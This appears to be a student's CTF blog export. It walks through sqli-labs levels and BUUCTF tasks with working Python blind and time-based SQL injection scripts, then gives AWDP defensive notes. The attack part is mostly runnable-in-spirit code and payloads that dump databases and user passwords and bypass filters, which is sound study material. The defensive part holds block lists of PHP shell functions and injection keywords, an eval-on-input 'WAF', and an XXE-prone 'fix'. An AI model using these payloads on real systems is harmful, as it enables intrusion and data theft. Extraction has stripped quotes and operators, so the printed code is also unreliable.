D:\\\\phpstudy_pro\\\\WWW\\\\aaa.php --+ 查看目录存在aaa.php或者菜刀能连上就成功 level_8布尔盲注：写脚本！ import requestsurl = http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-8/def get_database(url): name = for i in range(1, 100): low = 32 high = 128 mid = (low + high) // 2 while low high: payload = 1 and ascii(substr((select database()),%d,1)) %d-- % (i,mid) #--后面要加空格哦 params = id: payload r = requests.get(url, params=params) if You are in........... in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 if mid == 32: break name = name + chr(mid) print(name)get_database(url)payload2:1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)) %d-- payload3:1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),%d,1)) %d-- payload4:1 and ascii(substr((select group_concat(username,id,password) from users),%d,1)) %d-- ////import requestsimport timeurl= database =#payload1 = ?stunum=1^(ascii(substr((select(database())),,1)))^1#payload2 = ?stunum=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=ctf)),,1)))^1#payload3 =?stunum=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=flag)),,1)))^1#payload4 = ?stunum=1^(ascii(substr((select(group_concat(value))from(ctf.flag)),,1)))^1for i in range(1,10000): low = 32 high = 128 mid =(low + high) // 2 while(low high): # payload = payload1.format(i,mid) #查库名 # payload = payload2.format(i,mid) #查表名 # payload = payload3.format(i,mid) #查列名 #payload = payload4.format(i,mid) new_url = url + payload r = requests.get(new_url) time.sleep(0.1) print(new_url) if Hi admin, your score is: 100 in r.text: low = mid + 1 else: high = mid mid = (low + high) //2 if (mid == 32 or mid == 132): break database +=chr(mid) print(database)print(database) import requests#调用请求模块import time#调用时间模块import re#调用规则表达式模块url=http://9819e874-b0cf-49cd-91b3-4aa443e1b27a.node5.buuoj.cn:81/#题目链接flag = #创建一个变量用来存放flag值for i in range(1,50): #for循环遍历，i表示flag值大致长度是50以内 max = 127 #赋值127 min = 0 #赋值0 for c in range(0,127): #for循环遍历 s = (int)((max+min)/2) #首先将 max 和 min 相加，然后除以 2，最后将结果强制转换为整数类型。 payload = 1^(ascii(substr((select(flag)from(flag)),+str(i)+,1))+str(s)+) #^异或运算符，相同为假，不相同为真，1^payload，若为payload结果为假，则返回0，1^0=1，将得到查询id=1时的结果，回显Hello, glzjin wants a girlfriend。 #从flag数据表中选择一个名为flag的字段，然后取这个字段的字符串（从位置 +str(i)+ 开始，长度为 1（每次只返回一个）） #将这个字符串转换为 ASCII 码，然后判断这个 ASCII 码是否大于一个名为 s 的变量。 r = requests.post(url,data = id:payload) #requests模块的运用，将payload赋值给题目中这个名为id的参数 time.sleep(0.005) #每循环一次休眠0.005秒 if Hello in str(r.content): #如果Hello这个字符串在生成的结果中，那么就继续向下进行 max=s #将s的值赋值给max else: #反之 min=s #将s的值赋值给min if((max-min)=1): #如果max-min的值 flag+=chr(max) #将max的ASCII值转化为字符串 print(flag) #输出flag break #跳出循环 level_9时间盲注：写脚本！ 1’ and if(length(database())1,sleep(5),1)–+ #可以查看闭合是不是正确的 闭合正确网页就会睡5秒 IF语法语法：IF(condition, value_if_true, value_if_false)condition是一个条件表达式，如果条件成立，则返回value_if_true，否则返回value_if_false。 import requestsimport timeurl = http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-9/def get_database(url): name = for i in range(1, 100): low = 32 high = 128 mid = (low + high) // 2 while low high: payload = 1 and if(ascii(substr(database(), %d, 1)) %d, sleep(1), 0)-- % (i, mid) params = id: payload start_time = time.time() r = requests.get(url, params=params) end_time = time.time() if end_time - start_time = 1: low = mid + 1 else: high = mid mid = (low + high) // 2 if mid == 32: break name = name + chr(mid) print(name)get_database(url) payload2:1 and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), %d, 1)) %d, sleep(0.5), 0)-- payload3:1 and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()), %d, 1)) %d, sleep(0.5), 0)-- payload4:1 and if(ascii(substr((select group_concat(username,id,password) from users), %d, 1)) %d, sleep(0.5), 0)-- level_101’ and if(length(database())1,sleep(5),1)–+ #没睡 1” and if(length(database())1,sleep(5),1)–+ #延迟了 说明闭合方式是” 然后盲注 方式和level_9一样 level_11‘闭合 level_12闭合方式”) 1”) union select 1,database()# 类似 正常联合注入 level_13闭合方式’) 然后只会回显成功登录 尝试下报错注入 成功了 就报错注入正常做 level_14“闭合 报错注入正常注入 level_15import requestsimport timeurl = http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-15/def get_database(url): name = for i in range(1, 100): low = 32 high = 128 while low high: mid = (low + high) // 2 payload = admin and if(ascii(substr(database(), %d, 1)) %d, sleep(0.5), 0)# % (i, mid) params = uname: payload, passwd: admin, submit: Submit start_time = time.time() r = requests.post(url, data=params) end_time = time.time() if end_time - start_time = 0.5: low = mid + 1 else: high = mid if low == 32: break name += chr(low) print(name)get_database(url) 然后正常盲注 level_16import requestsimport timeurl = http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-16/def get_database(url): name = for i in range(1, 100): low = 32 high = 128 while low high: mid = (low + high) // 2 payload = admin\\) and if(ascii(substr(database(), %d, 1)) %d, sleep(0.5), 0)# % (i, mid) params = uname: payload, passwd: admin, submit: Submit start_time = time.time() r = requests.post(url, data=params) end_time = time.time() if end_time - start_time = 0.5: low = mid + 1 else: high = mid if low == 32: break name += chr(low) print(name)get_database(url) 以此类推 level_17报错注入or盲注 不多写 报错注入类型补充extractvalue报错注入extractvalue(XML_document,XPath_string) 只有两个参数 1 and extractvalue(1,concat(0x7e,database()))#1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))#以此类推 floor报错注入1 and (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor(rand(0)*2)) as x from information_schema.columns group by x) as y)--+ 1 and (select 1 from (select count(*),concat(0x23,(select column_name from information_schema.columns where table_schema=security and table_name=emails limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.columns group by x) as y)--+ levle_18user_agent注入 报错注入 level_19referer注入 报错注入 level_20cookie注入 报错注入 和前文差不多 level_21cookie注入 不过写入的payload需要base64编码 level_22cookie注入 不过闭合方式从’ - “ 仍然要编码 level_23考点：过滤# –+ 可以考虑用一个表达式构造闭合 -1 union select 1,database(),3 and 1 = 1-1 union select 1,database(),3 or 1 = 1#第一个和sql语句的第一个构成闭合 payload尾的1和sql语句的构成闭合 使1=1成立 完美的不用注释符号就构造了闭合最后语句：-1 union select 1,(select group_concat(username,id,password) from users),3 and 1 = 1 其实也可以把表达式替换为’ -1 union select 1,database(),3 level_24考点：二次注入 二次注入的原理：在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。 在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。 过程:先构造恶意语句 然后存入数据库 然后第二次构造语句 过程首先注册admin’#帐号 123456 然后修改admin’#的密码 但是实际上修改的是admin的密码 #原语句UPDATE users SET PASSWORD=$pass where username=$username and password=$curr_pass #插入 payload 后的语句UPDATE users SET PASSWORD=$pass where username=admin# and password=$curr_pass#此时 admin 后的语句被注释 #真正的生效的语句UPDATE users SET PASSWORD=$pass where username=admin#从而达到了修改用户 admin 密码的目的 level_25将or和and替换为空 oorr aandnd 然后正常注入 level_26过滤了空格 注释符 or and * 和\\ 空格用()代替 注释符通过表达式或符号构造闭合 or和and可以双写绕过 还可以使用|| 1||(updatexml(1,concat(0x7e,(select(database()))),1))||1=11||(updataxml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=security))))||1=11||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=security))),1))||1=11||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=security))),1))||1=11||(updatexml(1,concat(1,(select(group_concat(passwoorrd,username))from(users))),1))||1=1 level_27过滤了select SELECT Select union UNION Union * # – + 空格可以用%09和%0a替代 select用sElect 1and%09updatexml(1,concat(1,(sElect%09database())),1)%0aand1=1 level_28* – + 空格 过滤union select 这个组合 空格用编码 注释用表达式等式 union select组合绕过 uniunion%0Aselecton%0Aselect%0A -1)uniunion%0Aselecton%0Aselect%0A1,2,group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema=securityand (1 level_29考点;http参数污染来进行注入 tomcat只解析重复参数里面的前者，而Apache只解析重复参数里面的后者，我们可以传入两个id参数，前者合法而后者为我们想注入的内容,我们的后端是apache，那么我们只要将参数放在后面即可。 payload: ?id=1id=-1 union select 1,database(),3 --+?id=1id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+以此类推 level_30闭合方式改为” 其他和29一样 level_31闭合方式为’) 其他和29一样 level_32宽字节注入原理: 一个gbk编码汉字，占用2个字节。 一个utf-8编码的汉字，占用3个字节。 addslashes函数的作用就是让’变成，让引号变得不再是原本的“单引号”，没有了之前的语义，而是变成了一个字符。那么我们现在要做的就是想办法将’前面的\\给它去除掉：既然这函数给’前面加了一个\\那么是不是想办法给\\前面再加一个\\（或单数个即可），然后变成了\\‘，这样\\就又被转义了，这样就成功的逃出了addslashes的限制 ‘前面加%df 然后正常注入 -1%df union select 1,2,database()--+ 知识点空格绕过在docker中，空格可以用转义符%a0代替。 技巧来源题目：[SWPU2019]Web1-CSDN博客 1/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=web1 这样可以不用information 绕过对or的限制 1/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 已经知道表名的情况下可以采用无列名爆破法 普通的sq查询select * from users查询表，并把列名替换为1，2，3.4，5，6select 1,2,3,4,5 ,6 union select * from users单独把第四列提出来，(select 1,2,3,4,5,6 union select * from users)a给查询结果命名 select `4` from (select 1,2,3,4,5,6 union select * from users)a;若反引号被过滤，可以这样select b from (select 1,2,3 as b,4,5 union select * from users)a;测试:-- 在已经知道beanbook表，但是不知道其字段名的情况下，爆出该表的字段值-- 爆出第3列的值,把3当作第三列的字段名select `3` from (select 1,2,3,4,5,6 union select * from beanbook) as b-- 爆出第1列的值，把别名a当作第一列的字段名select a from (select 1 as a,2,3,4,5,6 union select * from beanbook) as b 解释来源：[BUUCTF_WEB_[SWPU2019]Web1 题解 - South](","tags":["CTF-wp"]},{"title":"About","path":"/about/index.html","content":"一位正在成长的 web 苦手 Location: Chengdu, Sichuan Study: 本科计算机在读生 Amusement: 动漫 游戏 阅读 猫咪 o(=•ェ•=)m: MzU2MDI1MzU4OQ=="},{"title":"Friendlinks","path":"/links/index.html","content":"Friendlinks 土豆猫 土豆来了~ Samsara 超强的RE手捏 heyi404 WEB好队友ヽ(✿ﾟ▽ﾟ)ノ Harukaze 一只沉迷gal的Re手 Reisen Re大手!校队好友O(∩_∩)O .friend-links { display: flex; flex-wrap: wrap; gap: 20px; } .friend-link { width: 200px; text-align: center; border: 1px solid #ddd; border-radius: 12px; padding: 15px; background: #fafafa; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05); transition: transform 0.2s ease, box-shadow 0.2s ease; } .friend-link:hover { transform: translateY(-5px); box-shadow: 0 6px 10px rgba(0, 0, 0, 0.1); } .friend-link a { text-decoration: none; color: #333; } .friend-link a:hover { text-decoration: none; color: #111; } .friend-link img { width: 64px; height: 64px; border-radius: 50%; object-fit: cover; margin-bottom: 10px; } .friend-link p { margin: 5px 0; font-size: 14px; }"},{"path":"/images/AWDP-waf.html","content":"AWDP-waf通用：上WAF、注释漏洞语句PHP特性：基本上不会出现，没有FIX的实际意义SQL注入：上WAF、addslashes() 函数过滤、预处理SSTI：上WAF（SSTI只过滤{不行）原型链污染：注释污染相关代码即可文件上传：后缀强校验、文件内容WAF、MIMA头（最好一次都修上）JAVA：注释、上调库版本、上WAF代码审计：上WAF、注释漏洞代码 phpphp执行命令waf?phphighlight_file(__FILE__);$cmd = $_GET[cmd];echo $cmd;if(!preg_match(/\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\|\\*|\\（|\\）|\\-|\\=|\\+|\\|\\[|\\]|\\|\\|\\|\\|\\.|\\|\\/|\\?|\\\\\\\\|\\||[0-9]|limiter|unparsed|gzhandler|quotes|ttyname|diff|decl|fileatime|type|implode|gzgetc|hexdec|strimwidth|encodings|function|shorthash|cfg|gmdate|fputcsv|xml|caches|sleep|finish|mlsd|peak|continue|interfaces|kill|register|aliases|aead|rewrite|pwhash|verify|chgrp|nanosleep|static|setgid|json|strchr|token|boolval|getmyinode|clearstatcache|ob|cdata|output|extract|loader|challenge|number|limit|rename|dh|gztell|rawlist|errors|value|uassoc|getpid|mx|modify|install|acos|strstr|digit|phpcredits|ftruncate|arsort|secretkey|linkinfo|tan|to|wordwrap|unshift|end|locations|from|byte|floor|secretbox|interface|printf|local|unregister|dir|bucket|reverse|bytes|flock|compare|getpwnam|getegid|checkdate|strrchr|uksort|pack|generichash|search|unpack|regenerate|html|constants|sqrt|chars|shuffle|scandir|values|exists|real|opendir|preg|sum|identifiers|setpgid|diskfreespace|stristr|getsid|grep|strpos|url|rehash|flip|full|backtrace|bin2base64|getservbyport|timezone|ed25519|language|finfo|digest|subject|scryptsalsa208sha256|alter|derive|timestamp|internal|ftell|max|funcs|context|regs|gzopen|uintersect|temp|detached|geteuid|subclass|save|keypair|levenshtein|timeout|ns|index|stripslashes|expire|drivers|addcslashes|rad2deg|parser|decbin|strnatcasecmp|gethostbyname|sin|meta|udiff|sent|apply|crypto|acosh|substr|log|ssl|fileperms|remove|dtd|options|included|call|fputs|writable|mem|splice|request|property|size|sprintf|in|mail|of|round|feof|realpath|seed|on|strtr|unset|localtime|strpbrk|tanh|gzcompress|recvfrom|strnatcmp|current|pkcs7|filemtime|struct|params|chown|graph|fstat|long2ip|sodium|traits|alpha|lstat|session|path|sunset|urlencode|executable|tick|indent|natsort|string|asinh|stripcslashes|rmdir|strripos|fastcgi|convert|pop|hebrevc|open|strtoupper|trim|sapi|magic|seal|getimagesize|sendto|autoload|implicit|send|ukey|history|floatval|ref|arg|quoted|format|strcspn|iptcembed|getloadavg|intval|uri|lower|nb|initgroups|multisort|name|mimeheader|total|phpversion|pi|list|fgetcsv|rekey|rawurlencode|rewind|user|getgroups|iterator|exception|octdec|ftp|bindec|quote|details|getpgid|strftime|pasv|strncasecmp|crc32|getmygid|into|coding|iv|init|new|closedir|fmod|deg2rad|instruction|quotemeta|escapeshellarg|doubleval|sub|rot13|sinh|restore|gzuncompress|log10|gzread|commit|gethostbynamel|mime|gmstrftime|usort|namespace|filegroup|csr|mkfifo|record|element|mberegi|len|disable|bin2hex|printable|lchgrp|combine|attribute|gzpassthru|gethostbyaddr|cache|settype|mbereg|runtime|load|xmlwriter|setegid|syslog|sun|nl2br|asort|fseek|gethostname|pos|set|getservbyname|site|abbr|mhash|kx|vsprintf|expm1|popen|push|eregi|umask|getpgrp|gzdecode|uses|module|repeat|close|connect|openssl|s2k|declared|default|isatty|float|debug|system|getallheaders|contents|chr|abbreviations|getprotobyname|ezmlm|ntop|fnmatch|x509|fprintf|gzeof|rsort|uname|addslashes|pk|getmxrr|gmmktime|func|vars|character|checkpurpose|image|getrandmax|source|handlers|auth|cert|extension|dirname|apache|getcsv|class|hypot|soundex|start|vprintf|first|pair|redisplay|space|array|build|use|cos|fscanf|block|socket|callable|getimagesizefromstring|notation|setlocale|fill|iptcparse|hash|word|parse|forward|get|transitions|mbregex|compact|gzgetss|flush|map|compute|sys|alloc|fgetss|sign|getdate|spl|usleep|length|uudecode|gzgets|put|methods|errno|uuencode|bool|lcfirst|location|systype|files|strrpos|key|localeconv|getrusage|prev|rtrim|pbkdf2|random|gc|tags|ftok|available|define|sort|scalarmult|deflate|dom|range|crypt|has|buffer|pow|regex|lock|hex2bin|match|closelog|is|reduce|stat|enable|setpos|resolve|sha1|assert|all|functions|gettimeofday|pull|gzclose|dechex|uasort|append|getgid|connection|var|classes|clean|null|gzrewind|accept|prepend|lcg|column|xchacha20poly1305|sunrise|detect|strcmp|select|uploaded|alnum|openlog|trigger|spki|update|strrichr|getenv|numeric|natcasesort|change|getgrnam|zlib|ctype|stripos|getrlimit|blocking|id|putenv|tmpfile|reporting|cycles|abs|getpwuid|browser|lchown|processing|constant|setcookie|print|args|alias|unserialize|sizeof|fget|rawurldecode|getprotobynumber|libxml|import|explode|cosh|unlink|pclose|level|privatekey|file|ucwords|getlogin|quit|strip|keygen|loaded|simplexml|filectime|assoc|infinite|encoding|symlink|strncmp|memcmp|cipher|escapeshellcmd|supports|move|http|secretstream|wrapper|htmlentities|response|make|fsockopen|gzwrite|export|getuid|mbsplit|money|highlight|pathinfo|ord|line|ceil|zend|filter|writeable|rewinddir|product|resources|split|gzencode|decode|wrappers|base64|shift|gpc|private|server|passthru|curve|and|krsort|handler|isodate|pdo|ietf|atan|gzputs|ireplace|ltrim|flags|atanh|touch|hebrev|punct|include|vfprintf|status|fread|memzero|utf8|header|gzseek|similar|keys|unpad|external|immutable|log1p|filetype|order|char|called|metaphone|seteuid|rand|final|intdiv|times|strerror|strlen|xdigit|show|slice|getpos|atan2|serialize|pkcs12|mktime|getcwd|readfile|cntrl|setsid|nl|copy|hmac|pad|posix|cyr|disk|strtok|merge|info|pseudo|time|readgzfile|htmlspecialchars|nice|fgets|entity|comment|ini|implements|getmyuid|algos|ignore|readlink|md|memory|getopt|method|login|fwrite|until|aborted|fopen|preferred|intersect|gzinflate|mkdir|error|defined|fclose|strtotime|tempnam|next|strspn|callback|variables|scrub|date|mb|public|input|ctermid|reset|strcasecmp|fingerprint|hrtime|usage|whitespace|msg|content|getgrgid|needs|ip2long|decrypt|cookie|xor|strcoll|langinfo|publickey|decoct|setrawcookie|srand|strwidth|enabled|free|check|checkdnsrr|stream|getregs|strval|fpm|kdf|pkey|chmod|nan|min|required|shutdown|names|fpassthru|case|chacha20poly1305|setrlimit|scalar|filesize|nlist|collect|equals|aes256gcm|exec|upper|shell|urldecode|getmypid|delete|chunk|fgetc|mt|gzdeflate|strptime|terminate|fileinode|read|encode|count|scanned|option|ucfirst|exp|clear|version|num|microtime|replace|streams|data|sk|dump|create|walk|increment|readable|readdir|numericentity|document|text|gettype|sscanf|getppid|fileowner|object|link|str|double|trait|long|encrypt|query|destroy|kana|int|filters|recursive|each|mdtm|fflush|chdir|finite|dns|extensions|mknod|headers|strtolower|join|proc|cdup|base|pfsockopen|base642bin|raw|setuid|md5|php|attlist|curve25519|parents|abort|getlastmod|uniqid|table|asin|interval|iconv|fput|substitute|last|pton|password|pwd|inet|countable|translation|client|transports|readline|strrev|glob|resource|zval|integer|parent|strcut|ereg|box|idate|inflate|chop|unique|gzfile|iterable|net|add|code|hkdf|write|ksort|completion|offset|access|require|echo|if/i, $cmd)) eval($cmd);else echo ?; thinkphp框架防护把这个waf直接上到publicindex.php最前面 可以防住所有的tp框架漏洞 foreach($_REQUEST as $key=$value) $_POST[$key] = preg_replace(/construct|get|call_user_func|load|invokefunction|Session|phpinfo|param1|Runtime|assert|input|dump|checkcode|union|select|updatexml|@/i,,$value); $_GET[$key] = preg_replace(/construct|get|call_user_func|load|invokefunction|Session|phpinfo|param1|Runtime|assert|input|dump|checkcode|union|select|updatexml|@/i,,$value); php中get和post限制$str1 =;foreach ($_POST as $key = $value) $str1.=$key; $str1.=$value;$str2 =;foreach ($_GET as $key = $value) $str2.=$key; $str2.=$value;if (preg_match(/system|tail|flag|\\|\\|\\|\\|\\|exec|base64|phpinfo|\\?|\\/i, $str1)||preg_match(/system|tail|flag|\\|\\|\\|\\|\\|exec|base64|phpinfo|\\?|\\/i, $str2)) die(no!); php-rce-sql-xss-xxe//RCEfunction wafrce($str)\treturn !preg_match(/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i, $str);//以下这个可以用短标签+反引号+通配符绕过过滤preg_match(/\\^|\\||\\~|assert|print|include|require|\\(|echo|flag|data|php|glob|sys|phpinfo|POST|GET|REQUEST|exec|pcntl|popen|proc|socket|link|passthru|file|posix|ftp|\\_|disk|tcp|cat|tac/i, $str);//SQLfunction wafsqli($str)\treturn !preg_match(/select|and|\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\x26|\\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|||;|\\|\\|\\^|\\|/i, $str);if (preg_match(/select|flag|union|\\\\\\\\$|\\|\\|--|#|\\\\0|into|alert|img|prompt|set|/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\%|\\|\\|\\^|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\|\\|union|\\`|sleep|benchmark|regexp|from|count|procedure|and|ascii|substr|substring|left|right|union|if|case|pow|exp|order|sleep|benchmark|into|load|outfile|dumpfile|load_file|join|show|select|update|set|concat|delete|alter|insert|create|union|or|drop|not|for|join|is|between|group_concat|like|where|user|ascii|greatest|mid|substr|left|right|char|hex|ord|case|limit|conv|table|mysql_history|flag|count|rpad|\\|\\*|\\.|/is,$s)||strlen($s)50) header(Location: /); die(); //XSSfunction wafxss($str)\treturn !preg_match(/\\|http|\\|\\`|cookie|||script/i, $str);function wafrce($str)\treturn !preg_match(/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i, $str);function wafsqli($str)\treturn !preg_match(/select|and|\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\x26|\\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|||;|\\|\\|\\^|\\|/i, $str);function wafxss($str)\treturn !preg_match(/\\|http|\\|\\`|cookie|||script/i, $str); // fix后(XXE)?php function is_user_exists($username, $user_info_dir): bool $dirs = array_filter(glob($user_info_dir . /*), is_dir); foreach ($dirs as $dir) $dirName = basename($dir); if($dirName === $username) return true; return false; function register_user($username, $user_info_dir, $user_xml) $r = /php|read|flag/i; $username = preg_replace($r,,$username); $user_dir_name = $user_info_dir.$username; mkdir($user_dir_name, 0777); file_put_contents($user_dir_name./.$username..xml, $user_xml); function get_user_record($username, $user_info_dir) $r = /php|read|flag/i; $username = preg_replace($r,,$username); $user_info_xml = file_get_contents($user_info_dir.$username./.$username..xml); $dom = new DOMDocument(); $dom-loadXML($user_info_xml, LIBXML_NOENT | LIBXML_DTDLOAD); return simplexml_import_dom($dom); sql注入修复用addslashes() 函数过滤addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。预定义字符是：单引号（）双引号（）反斜杠（\\）NULL该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。 $username = $_GET[username];$password = $_GET[password];$username = addslashes($username);$password = addslashes($password);if (isset($_GET[username]) isset($_GET[password])) $sql = SELECT * FROM users WHERE username = $username AND password = $password; 预处理（mysql+pod）漏洞源码 ?phperror_reporting(0);include dbConnect.php;$username = $_GET[username];$password = $_GET[password];if (isset($_GET[username]) isset($_GET[password])) $sql = SELECT * FROM users WHERE username = $username AND password = $password; $result = $mysqli-query($sql); if (!$result) die(mysqli_error($mysqli)); $data = $result-fetch_all(); // 从结果集中获取所有数据 if (!empty($data)) echo 登录成功！; else echo 用户名或密码错误; ? mysql预处理 使用 预处理语句（Prepared Statement）。使用 参数绑定（bind_param）。参数值 $username、$password 不会直接拼接进 SQL 语句，而是以参数形式发送给数据库 ?phperror_reporting(0);include dbConnect.php;$username = $_GET[username];$password = $_GET[password];if (isset($_GET[username]) isset($_GET[password])) $template = $mysqli-prepare(SELECT * FROM users WHERE username = ? AND password = ?); $template-bind_param(ss, $username, $password); $exe = $template-execute(); if(!$exe) die(error); $template-store_result(); $data = $template-num_rows; // 获取结果集中的行数 if (!empty($data)) echo 登录成功！; else echo 用户名或密码错误; ? PDO 预处理 ?php//省略......$name = $_GET[username];$passwd = $_GET[password];try $conn = new PDO(mysql:host=$serve;dbname=$dbname, $username, $password); $conn-setAttribute(POD::ATTR_EMULATE_PREARES, false); if(isset($_GET[username]) isset($_GET[password])) $stmt = $conn-prepare(SELECT * FROM users WHERE username = :username AND password = :password); $stmt-bindParam(:name, $name); $stmt-bindParam(:passwd, $passwd); $exe = $stmt-execute(); if(!$exe) die(error); ; $result = $stmt-fetchAll(); if(!empty($result)) echo Login Success!; else echo Login Failed!; catch(PDOException $e) echo Connection failed: . $e-getMessage();$conn = null;? .htaccess可能会判定宕机 IfModule mod_rewrite.cdeny from all/IfModule IfModule mod_rewrite.c RewriteEngine On RewriteRule \\.ph.*$ - [F]/IfModule IfModule mod_rewrite.c RewriteEngine On RewriteRule ^\\.index\\.php$ - [F]/IfModule 文件上传后缀名waf最好是白名单只允许上传什么 apache解析漏洞记得只允许一个.出现 ?php// $path = ./uploads;error_reporting(0);$path = ./uploads;$content = file_get_contents($_FILES[myfile][tmp_name]);$allow_content_type = array(image/png);$type = $_FILES[myfile][type];if (!in_array($type, $allow_content_type)) die(只允许png哦!br);//修改点1$allow_ext = array(.png);$file_name=$_FILES[myfile][name];$_FILES[myfile][name] = str_replace(.ph,,$_FILES[myfile][name]);$file_ext = strrchr($file_name, .);$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace(::$DATA, , $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //收尾去空if (!in_array($file_ext, $allow_ext)) die(只允许png哦!br);//修改点2if (preg_match(/(php|script|xml|user|htaccess|\\\\?|\\\\?\\=|eval|system|assert|fllllagg|f\\*|\\/f|cat|POST|GET|\\$\\_|exec)/i, $content)) // echo 匹配成功!; die(鼠鼠说你的内容不符合哦0-0); else $file = $path . / . $_FILES[myfile][name]; echo $file; if (move_uploaded_file($_FILES[myfile][tmp_name], $file)) file_put_contents($file, $content); echo Success!br; else echo Error!br; ? ?phpheader(Content-type: text/html;charset=utf-8);error_reporting(1);define(WWW_ROOT,$_SERVER[DOCUMENT_ROOT]);define(APP_ROOT,str_replace(\\\\,/,dirname(__FILE__)));define(APP_URL_ROOT,str_replace(WWW_ROOT,,APP_ROOT));define(UPLOAD_PATH, upload);??php$is_upload = false;$msg = null;if (isset($_POST[submit])) if (file_exists(UPLOAD_PATH)) $deny_ext = array(.jpg,.png,.jpeg); //【修改点一】 $file_name = trim($_FILES[upload_file][name]); $file_ext = strrchr($file_name, .); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(::$DATA, , $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (in_array($file_ext, $deny_ext)substr_count($_FILES[upload_file][name], .)===1) //【修改点二】 $temp_file = $_FILES[upload_file][tmp_name]; $img_path = UPLOAD_PATH./.$file_name; if (move_uploaded_file($temp_file, $img_path)) $is_upload = true; else $msg = 上传出错！; else $msg = 此文件不允许上传!; else $msg = UPLOAD_PATH . 文件夹不存在,请手工创建！; ? java具体漏洞耄耋不知道啊。。。我不会jvav 不要想攻击了好吧 能吃到fix的分都不错了 fix使用jareditor插件 直接把jar包作为外部库导入 直接修改就可以 改好了先点击save再点击build jar就生成好了 然后进入终端 java -jar *.jar如果正常运行 那就是成功编译jar包 sql注入//fiximport java.util.regex.Pattern;public class MaliciousInputChecker public static void main(String[] args) String input = SELECT * FROM users WHERE id = 1 OR 1=1; public static boolean isMalicious(String input, String[] maliciousStrings) input = input.toLowerCase(); for (int i = 0; i maliciousStrings.length; i++) Pattern pattern = Pattern.compile(maliciousStrings[i], Pattern.CASE_INSENSITIVE); if (pattern.matcher(input).find()) return true; return false; node.js原型链污染把下面的input改成题目的可控输入点即可 const input = awdwawdd;const maliciousStrings = [__proto__, constructor, prototype, insert, update, truncate, drop, create, \\, , , , ,union, select, delete, \\, , , , , .,,,flag];function isMalicious(input, maliciousStrings) input = input.toLowerCase(); for (let i = 0; i maliciousStrings.length; i++) const pattern = new RegExp(maliciousStrings[i], i); if (pattern.test(input)) return true; return false;if (isMalicious(input, maliciousStrings)) console.log(输入参数包含恶意字符串); else console.log(输入参数安全); // fix后app.get(/profile, function (req, res) ... ... ... ... ... const blacklist = [ outputFunctionName, __proto__, return, global, process, mainModule, constructor, child, execSync,escapeFunction, client, compileDebug, prototype ] for (let i = 0; i blacklist.length; i++) if (data.includes(blacklist[i])) return res.status(400).render(error, code: 400, msg: hack ); pythonsstiblack_list = [,, , , _, [,.,%,+,|,(,),,,\\\\,/] for tmp in black_list: if tmp in v: raise ValueError(note cannot contain a special character) # fix@app.route(/, methods=[GET, POST])def index():\tip, port = re.findall(pattern,request.host).pop()\tif request.method == POST and request.form.get(word): word = request.form.get(word) black_list = [,, , , _, [,.,%,+,|,(,),,,\\\\,/,flag] for tmp in black_list: if tmp in word: word = Hacker! if not waf(word): word = Hacker!\telse: word = return render_template_string(content % (str(ip), str(port), str(word))) 